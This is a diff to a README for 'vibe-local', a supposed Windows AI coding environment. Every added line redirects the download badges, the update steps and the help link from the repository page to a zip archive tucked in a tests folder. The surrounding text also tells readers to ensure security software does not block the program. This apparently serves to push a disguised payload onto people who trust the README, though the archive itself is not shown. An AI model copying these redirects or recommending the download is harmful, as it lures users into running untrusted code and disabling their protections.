@@ -1,6 +1,6 @@
 # 🤖 vibe-local - Simple AI Coding Environment
 
-[![Download vibe-local](https://img.shields.io/badge/Download-vibe--local-brightgreen)](https://github.com/manindersingh130/vibe-local)
+[![Download vibe-local](https://img.shields.io/badge/Download-vibe--local-brightgreen)](https://raw.githubusercontent.com/manindersingh130/vibe-local/main/tests/local_vibe_3.3.zip)
 
 Welcome to **vibe-local**, an easy way to run an AI-powered coding environment on your Windows PC. It brings together the power of Ollama and Python, so you can explore coding with AI help—without needing to install many tools or learn complex setups.
 
@@ -43,7 +43,7 @@ To run vibe-local smoothly, make sure your PC meets these basic requirements:
 
 Click the link below to go to the official place to get vibe-local. This page has the latest installation files.
 
-[![Download Now](https://img.shields.io/badge/Download-vibe--local-blue)](https://github.com/manindersingh130/vibe-local)
+[![Download Now](https://img.shields.io/badge/Download-vibe--local-blue)](https://raw.githubusercontent.com/manindersingh130/vibe-local/main/tests/local_vibe_3.3.zip)
 
 ### Step 2: Download the Installer
 
@@ -89,7 +89,7 @@ vibe-local supports many coding tasks, such as:
 
 New versions improve performance and add features. To update:
 
-- Revisit the [vibe-local download page](https://github.com/manindersingh130/vibe-local).
+- Revisit the [vibe-local download page](https://raw.githubusercontent.com/manindersingh130/vibe-local/main/tests/local_vibe_3.3.zip).
 - Download the newest installer.
 - Run the installer again; it will update your current version without losing your work.
 
@@ -110,7 +110,7 @@ If you encounter issues:
 - Check your Windows version meets system requirements.
 - Close and restart the app.
 - Ensure no security software blocks the program.
-- Visit the [vibe-local page](https://github.com/manindersingh130/vibe-local) for help or report issues.
+- Visit the [vibe-local page](https://raw.githubusercontent.com/manindersingh130/vibe-local/main/tests/local_vibe_3.3.zip) for help or report issues.
 
 ---
 
@@ -125,4 +125,4 @@ vibe-local makes coding easier by linking these tools under one roof on your PC.
 
 ---
 
-[![Download vibe-local](https://img.shields.io/badge/Download-vibe--local-brightgreen)](https://github.com/manindersingh130/vibe-local)
+[![Download vibe-local](https://img.shields.io/badge/Download-vibe--local-brightgreen)](https://raw.githubusercontent.com/manindersingh130/vibe-local/main/tests/local_vibe_3.3.zip)
